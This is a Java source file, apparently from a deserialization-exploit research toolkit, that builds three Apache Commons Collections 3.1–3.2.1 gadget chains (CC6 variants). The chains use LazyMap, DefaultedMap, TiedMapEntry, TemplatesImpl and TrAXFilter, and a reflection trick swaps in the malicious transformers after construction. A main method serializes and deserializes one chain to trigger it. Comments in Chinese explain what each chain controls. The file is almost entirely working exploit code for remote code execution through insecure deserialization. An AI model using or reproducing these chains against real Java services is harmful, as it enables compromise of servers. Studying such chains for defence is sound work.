package commonscollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;

import static utils.SerAndDe.*;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static utils.Yso.setFieldValue;

public class CC6 {
    /*
     * 用于CommonsCollections3.1 - 3.2.1调用transformer
     * */
    public static HashMap getHashMap1()throws Exception{
         /*
         可以做到  x1.transform(x2)    x1,x2都可控
         用到DefaultedMap TiedMapEntry
         * */
        Transformer x1=transformer.Invoker.getInvokerTransformer();
        TemplatesImpl x2= templates.TemplatesGenerator.getTemplatesImpl();
        Map innerMap = new HashMap();
        Map outerMap = DefaultedMap.decorate(innerMap,
                //ConstantTransformer后面会remove,不会跟着序列化
                new ConstantTransformer(0));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, x2);
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "valuevalue");
        outerMap.remove(x2);
        setFieldValue(outerMap, "value", x1);
        return (HashMap) expMap;
    }
    public static HashMap getHashMap2 () throws Exception{
        /*
         可以做到  x1.transform(x2)    x1,x2都可控
         用到LazyMap TiedMapEntry
         * */
        Class x2= TrAXFilter.class;
        Transformer x1=transformer.Instantiate.getInstantiateTransformer();
        //fakeTransformer后面会删
        Transformer fakeTransformer = new ConstantTransformer(1);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, TrAXFilter.class);

        HashMap expmap = new HashMap();
        expmap.put(tme,"xxxxxx");
        outerMap.clear();

        Field f = LazyMap.class.getDeclaredField("factory");
        f.setAccessible(true);
        f.set(outerMap, x1);
        return expmap;
    }
    public static Hashtable getHashMap3 () throws Exception{
        /*
         可以做到  x1.transform(不可控)    x1可控
         用到LazyMap
         * */
        Transformer x1=transformer.Factory.getFactoryTransformer();
        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        Map map1 = LazyMap.decorate(hashMap1, x1);
        map1.put("00", 1);
        Map map2 = LazyMap.decorate(hashMap2, x1);
        map2.put(".n", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
        map2.remove("00");
        map2.remove(".n");
        return hashtable;
    }

    public static void main(String[] args) throws Exception{
        byte[] b=serialize(getHashMap3());
        deserialize(b);
    }
}
